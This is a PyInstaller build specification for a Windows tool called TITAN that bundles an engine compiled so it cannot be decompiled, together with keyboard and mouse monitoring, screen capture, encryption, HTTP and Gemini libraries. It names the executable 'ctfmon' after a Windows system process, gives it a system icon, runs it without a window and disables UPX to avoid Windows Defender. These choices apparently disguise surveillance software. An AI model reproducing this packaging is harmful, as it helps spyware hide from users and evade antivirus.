# -*- mode: python ; coding: utf-8 -*-
# TITAN.spec — Cython edition
# Entry: start_engine.py (tiny stub)
# Engine: titan_engine.pyd (native C machine code, cannot be decompiled)
# UPX: DISABLED — prevents Windows Defender false positives

a = Analysis(
    ['start_engine.py'],
    pathex=['.'],
    binaries=[
        # Bundle the compiled Cython extension
        ('titan_engine.pyd', '.'),
    ],
    datas=[
        ('gemini.ini', '.'),   # engine reads SSL verify setting from this file
    ],
    hiddenimports=[
        # Win32 / COM
        'win32api', 'win32con', 'win32gui', 'win32process',
        'pywintypes', 'pythoncom', 'comtypes', 'comtypes.client',
        # UIA / automation
        'pywinauto', 'pywinauto.application', 'pywinauto.controls',
        'pywinauto.uia_defines', 'pywinauto.uia_element_info',
        # Input monitoring
        'pynput', 'pynput.keyboard', 'pynput.mouse',
        # Input simulation
        'pyautogui',
        # HTTP
        'requests', 'urllib3', 'certifi', 'charset_normalizer', 'idna',
        # Crypto
        'cryptography', 'cryptography.fernet',
        # Image capture
        'PIL', 'PIL.Image', 'PIL.ImageGrab',
        # Google Generative AI (Gemini)
        'google', 'google.generativeai',
        'google.ai', 'google.ai.generativelanguage',
        'google.api_core', 'google.api_core.exceptions',
        'google.auth', 'google.auth.credentials',
        'google.protobuf',
        # Stdlib extras
        'json', 'threading', 'queue', 'subprocess', 'time',
        'ctypes', 'ctypes.wintypes', 'struct', 'io',
        'configparser', 'logging', 're', 'random',
        'collections', 'warnings',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['tkinter', 'numpy', 'matplotlib', 'scipy', 'unittest', 'test', 'PyQt5', 'PyQt5.QtWidgets', 'PyQt5.QtCore', 'PyQt5.QtGui', 'PyQt5.QtWinExtras', 'PyQt5.sip'],
    noarchive=False,
    optimize=0,
)

pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='ctfmon',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=False,          # ← DISABLED: UPX triggers Windows Defender heuristics
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,   # silent in production — set True only to debug crashes
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='system.ico',
    uac_admin=False,
)
